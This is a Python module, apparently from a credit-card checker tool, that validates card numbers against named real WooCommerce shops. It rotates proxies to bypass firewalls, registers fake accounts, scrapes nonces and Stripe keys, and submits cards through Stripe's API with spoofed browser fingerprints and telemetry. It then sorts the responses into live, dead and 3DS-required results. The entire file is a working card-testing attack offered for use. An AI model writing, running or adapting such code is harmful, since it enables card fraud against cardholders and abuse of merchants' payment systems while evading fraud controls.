"""
gateways/stripe_wc_gate.py — WooCommerce Stripe SetupIntent Gateway
Confirmed working target: ea-courses.com
"""
import asyncio
import logging
import random
import re
import time
import json
from faker import Faker
import aiohttp
from aiohttp import ClientTimeout, CookieJar

from gateways.base import GatewayResult, CCStatus
from core.parser import CardData

logger = logging.getLogger("CC-Checker.StripeWC")
faker = Faker()

DEFAULT_SITE = "https://ea-courses.com"

# Telemetry browser user agent
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def _parse_stripe_decline(message: str) -> tuple[CCStatus, str]:
    """
    Parse Stripe tokenization errors (Step 4 only).
    SetupIntent failed (Step 5) = always DEAD.
    Stripe tokenization failed = always DEAD.
    """
    msg_lower = message.lower()
    if "expired" in msg_lower:
        return CCStatus.EXPIRED, message
    if any(k in msg_lower for k in ("stolen", "pickup", "lost_card")):
        return CCStatus.PICKUP, message
    # All other tokenization errors = DEAD
    return CCStatus.DEAD, message


async def check_stripe_wc_gate(card: CardData) -> GatewayResult:
    """
    Check a credit card using the WooCommerce Stripe SetupIntent flow.
    Supports sequential store/site fallback using the stripe_wc_gates table.
    Retries up to 3 times per site using different proxies to bypass firewalls.
    """
    import database.db as db
    
    sites = []
    try:
        sites = await db.get_active_stripe_wc_gates()
    except Exception:
        pass
        
    if not sites:
        sites = [DEFAULT_SITE, "https://dilaboards.com"]
        
    # Shuffle for rotation diversity
    random.shuffle(sites)
    
    # Cap attempts to max 4 sites
    max_attempts = min(4, len(sites))
    last_result = None
    
    for attempt in range(max_attempts):
        site_url = sites[attempt]
        
        # Try up to 3 different proxies for the same site if we face proxy/network blocks
        for proxy_attempt in range(3):
            logger.debug(f"[Stripe-WC attempt {attempt+1}.{proxy_attempt+1}] Trying site: {site_url}")
            
            result = await _check_stripe_wc_on_site(card, site_url)
            last_result = result
            
            # If we got a definitive card-level result (Charged, Declined, Insufficient, etc.)
            # return immediately. Do not retry.
            if result.status != CCStatus.ERROR:
                logger.debug(f"[Stripe-WC success on {site_url}] Result: {result.status.value} ({result.raw_code})")
                return result
                
            # If it's a proxy block (like HTTP 415, connection timeout), retry with a new proxy
            logger.debug(f"[Stripe-WC proxy fail on {site_url}] Error: {result.message} ({result.raw_code}). Retrying with another proxy...")
            await asyncio.sleep(0.3)
            
    return last_result or GatewayResult(
        status=CCStatus.ERROR, gateway="Stripe-WC",
        message="All WooCommerce Stripe sites failed", raw_code="all_sites_failed"
    )



async def _check_stripe_wc_on_site(card: CardData, site_url: str) -> GatewayResult:
    """
    Check a credit card on a single specific WooCommerce Stripe website using curl_cffi.
    """
    gate_name = "Stripe-WC"
    
    # Get a working proxy from proxy manager
    proxy_url = None
    try:
        from core.proxy_manager import get_random_proxy
        proxy_url = get_random_proxy()
    except Exception:
        pass

    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    
    # Candidate path sets for WooCommerce configurations (locale-aware/custom slugs)
    path_candidates = [
        {"add": "/my-account/add-payment-method/", "post": "/my-account/"},
        {"add": "/en/moj-racun/add-payment-method/", "post": "/en/moj-racun/"},
        {"add": "/moj-racun/add-payment-method/", "post": "/moj-racun/"},
    ]

    try:
        from curl_cffi.requests import AsyncSession
        
        async with AsyncSession(impersonate="chrome131") as session:
            headers = {
                "User-Agent": USER_AGENT,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }
            
            html_1 = ""
            active_paths = None
            
            # Subpath discovery
            errors = []
            for paths in path_candidates:
                url_1 = f"{site_url.rstrip('/')}{paths['add']}"
                try:
                    r = await session.get(url_1, headers=headers, proxies=proxies, timeout=10)
                    if r.status_code == 200:
                        # Validate if this is a WooCommerce Stripe checkout page containing publishable key
                        if "pk_live_" in r.text:
                            html_1 = r.text
                            active_paths = paths
                            break
                        else:
                            errors.append(f"{paths['add']} no pk_live_")
                    else:
                        errors.append(f"HTTP {r.status_code}")
                except Exception as e:
                    errors.append(f"err: {str(e)[:25]}")
            
            if not active_paths:
                diag_msg = ", ".join(errors) if errors else "No response"
                return GatewayResult(
                    status=CCStatus.ERROR, gateway=gate_name,
                    message=f"Endpoints not resolved: {diag_msg}", raw_code="site_unreachable"
                )

            post_url = f"{site_url.rstrip('/')}{active_paths['post']}"
            add_url = f"{site_url.rstrip('/')}{active_paths['add']}"

            # Nonce & PK search
            reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', html_1)
            pk_match = re.search('"key":"(.*?)"', html_1)
            
            if not reg_match:
                reg_match = re.search('name="woocommerce-login-nonce" value="(.*?)"', html_1)
                
            pk = None
            if pk_match:
                pk = pk_match.group(1)
            else:
                pk_fallback = re.search(r'pk_live_[a-zA-Z0-9]{24,}', html_1)
                if pk_fallback:
                    pk = pk_fallback.group(0)
                    
            if not pk:
                return GatewayResult(
                    status=CCStatus.ERROR, gateway=gate_name,
                    message="Failed to extract Stripe PK from page", raw_code="pk_extraction_failed"
                )


            # Step 2: Register user if not already registered
            fake_email = ""
            fake_user = ""
            fake_pass = ""
            account_created = False

            if reg_match:
                regester_nonce = reg_match.group(1)
                fake_user = faker.user_name()[:12] + str(random.randint(100, 999))
                fake_email = faker.email()
                fake_pass = "Pass" + str(random.randint(100000, 999999)) + "!"
                data_2 = {
                    'email'                      : fake_email,
                    'username'                   : fake_user,      # required by some WC sites
                    'password'                   : fake_pass,
                    'woocommerce-register-nonce' : regester_nonce,
                    'register'                   : 'Register',
                }
                try:
                    r_reg = await session.post(post_url, headers=headers, data=data_2, proxies=proxies, timeout=12)
                    # Check if session received logged-in cookie
                    for c_name in session.cookies.keys():
                        if "wordpress_logged_in" in c_name.lower():
                            account_created = True
                            break
                except Exception:
                    pass
                
                # Fetch add-payment-method page again as logged-in user
                try:
                    r_auth = await session.get(add_url, headers=headers, proxies=proxies, timeout=12)
                    html_1 = r_auth.text
                except Exception:
                    pass  # keep html_1 as-is (pre-login page might still have nonce)

            # Step 3: Extract AJAX nonce for Stripe SetupIntent
            # Try multiple patterns — different WC Stripe plugin versions use different keys
            nonce_patterns = [
                r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
                r"'createAndConfirmSetupIntentNonce'\s*:\s*'([^']+)'",
                r'"setupIntentNonce"\s*:\s*"([^"]+)"',
                r'"stripe_setup_nonce"\s*:\s*"([^"]+)"',
                r'"wc_stripe_setup_nonce"\s*:\s*"([^"]+)"',
                r'name="_ajax_nonce"\s+value="([a-f0-9]+)"',
                r'"_ajax_nonce"\s*:\s*"([a-f0-9]{10,})"',
                r'"nonce"\s*:\s*"([a-f0-9]{10,})"',
            ]
            ajax_nonce = None
            for pat in nonce_patterns:
                m = re.search(pat, html_1)
                if m:
                    ajax_nonce = m.group(1)
                    logger.debug(f"SetupIntent nonce found with pattern: {pat[:40]}...")
                    break

            if not ajax_nonce:
                logger.debug(f"Nonce not found on {site_url} — html snippet: {html_1[:300]}")
                return GatewayResult(
                    status=CCStatus.ERROR, gateway=gate_name,
                    message="SetupIntent AJAX nonce not found (Registration failed or site incompatible)",
                    raw_code="nonce_not_found"
                )

            # Step 4: Tokenize card details on Stripe API
            url_3 = "https://api.stripe.com/v1/payment_methods"
            muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
            sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
            guid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
            client_id = "src_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

            data_3 = {
                'type': 'card',
                'card[number]': card.number,
                'card[cvc]': card.cvv,
                'card[exp_year]': card.year,
                'card[exp_month]': card.month,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': '10001',
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
                'referrer': site_url,
                'time_on_page': str(random.randint(10000, 99999)),
                'client_attribution_metadata[client_session_id]': client_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': client_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
                '_stripe_version': '2024-06-20',
            }
            
            # Post to Stripe API (use proxies too to match browser TLS)
            r3 = await session.post(url_3, headers=headers, data=data_3, proxies=proxies, timeout=12)
            res_3_text = r3.text

            if r3.status_code != 200:
                try:
                    stripe_err = json.loads(res_3_text).get('error', {})
                    err_msg = stripe_err.get('message', 'Decline')
                    decline_code = stripe_err.get('decline_code') or stripe_err.get('code') or "card_declined"
                    
                    status, clean_msg = _parse_stripe_decline(err_msg)
                    return GatewayResult(
                        status=status, gateway=gate_name,
                        message=clean_msg, raw_code=decline_code
                    )
                except Exception:
                    return GatewayResult(
                        status=CCStatus.DEAD, gateway=gate_name,
                        message="Card declined by Stripe", raw_code="stripe_tokenize_failed"
                    )
                    
            pm = json.loads(res_3_text).get('id')

            # Step 5: Confirm on WooCommerce AJAX endpoint
            dynamic_params_4 = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }

            ajax_headers = {
                **headers,
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            }
            
            # Construct dynamic ajax URL
            ajax_url = site_url.rstrip("/") + "/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            if "/en/" in active_paths['post']:
                ajax_url = site_url.rstrip("/") + "/en/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            
            # POST with form data payload and AJAX headers
            r4 = await session.post(ajax_url, headers=ajax_headers, data=dynamic_params_4, proxies=proxies, timeout=12)
            res_4_text = r4.text

            try:
                res_json = json.loads(res_4_text)
                success = res_json.get("success")
                data = res_json.get("data", {})
                
                if success:
                    # SetupIntent succeeded! Card is valid and saved.
                    extra_res = {"site": site_url, "account_created": account_created}
                    if account_created:
                        extra_res["email"] = fake_email
                        extra_res["username"] = fake_user
                        extra_res["password"] = fake_pass
                    
                    msg_label = "Card Saved to Account" if account_created else "Guest SetupIntent Authorized"
                    return GatewayResult(
                        status=CCStatus.CHARGED, gateway=gate_name,
                        message=f"{msg_label} (SetupIntent Succeeded)", raw_code="approved",
                        charge_amount=0.0,
                        extra=extra_res
                    )

                
                # ── Detect ANY 3DS / Live indicator in response ─────────────────
                live_url = None
                live_reason = None
                
                if isinstance(data, dict):
                    # Check all possible redirect / action URL keys
                    live_url = (
                        data.get("redirect_url") or
                        data.get("redirectUrl") or
                        data.get("return_url") or
                        data.get("payment_intent_client_secret") or
                        data.get("setup_intent_client_secret")
                    )
                    # Check for requires_action or authentication_required
                    if data.get("requires_action") or data.get("requiresAction"):
                        live_reason = "3DS / Action Required"
                    # Check nested intent object
                    intent = data.get("intent") or data.get("paymentIntent") or {}
                    if isinstance(intent, dict):
                        intent_status = intent.get("status", "")
                        if intent_status in ("requires_action", "requires_confirmation"):
                            live_reason = "3DS Required (Intent Status)"
                        if not live_url:
                            live_url = intent.get("redirect_url") or intent.get("next_action", {}).get("redirect_to_url", {}).get("url")
                    # Check error code — authentication_required = bank confirmed card, 3DS needed
                    err_obj = data.get("error") or {}
                    if isinstance(err_obj, dict):
                        err_code = err_obj.get("code") or ""
                        if err_code in ("authentication_required", "setup_intent_authentication_failure"):
                            live_reason = "Authentication Required"
                
                if live_url or live_reason:
                    msg = live_reason or "3DS / Action Required (SetupIntent)"
                    return GatewayResult(
                        status=CCStatus.LIVE_VBV, gateway=gate_name,
                        message=msg, raw_code="3ds_required",
                        extra={"receipt_url": live_url or ""}
                    )
                
                # ── Parse specific bank decline messages from data ──────────────
                error_msg = ""
                error_code = "card_declined"
                if isinstance(data, dict):
                    error_msg = (
                        data.get("message") or
                        (data.get("error") or {}).get("message") or ""
                    )
                    error_code = (
                        (data.get("error") or {}).get("code") or
                        (data.get("error") or {}).get("decline_code") or "card_declined"
                    )
                elif isinstance(data, str):
                    error_msg = data

                if not error_msg:
                    error_msg = res_4_text[:120]

                # Classify bank response message
                msg_lower = error_msg.lower()
                if "insufficient" in msg_lower:
                    return GatewayResult(status=CCStatus.INSUFFICIENT, gateway=gate_name, message=error_msg, raw_code=error_code)
                if any(c in msg_lower for c in ("cvc", "cvv", "security code")):
                    return GatewayResult(status=CCStatus.CHARGED, gateway=gate_name, message=f"CVV Mismatch — {error_msg}", raw_code=error_code)
                if "do not honor" in msg_lower:
                    return GatewayResult(status=CCStatus.DO_NOT_HONOR, gateway=gate_name, message=error_msg, raw_code=error_code)
                if "expired" in msg_lower:
                    return GatewayResult(status=CCStatus.EXPIRED, gateway=gate_name, message=error_msg, raw_code=error_code)
                if any(k in msg_lower for k in ("stolen", "pickup", "lost_card")):
                    return GatewayResult(status=CCStatus.PICKUP, gateway=gate_name, message=error_msg, raw_code=error_code)
                
                return GatewayResult(
                    status=CCStatus.DEAD, gateway=gate_name,
                    message=error_msg or "Your card was declined", raw_code=error_code
                )
            except Exception:
                # Fallback parse
                if "success" in res_4_text.lower():
                    return GatewayResult(
                        status=CCStatus.CHARGED, gateway=gate_name,
                        message="Card Saved (SetupIntent Success)", raw_code="approved"
                    )
                return GatewayResult(
                    status=CCStatus.DEAD, gateway=gate_name,
                    message="Your card was declined", raw_code="generic_decline"
                )

    except asyncio.TimeoutError:
        return GatewayResult(
            status=CCStatus.ERROR, gateway=gate_name,
            message="Gateway Request Timeout", raw_code="timeout"
        )
    except Exception as e:
        return GatewayResult(
            status=CCStatus.ERROR, gateway=gate_name,
            message=f"Exception: {str(e)[:60]}", raw_code="exception"
        )

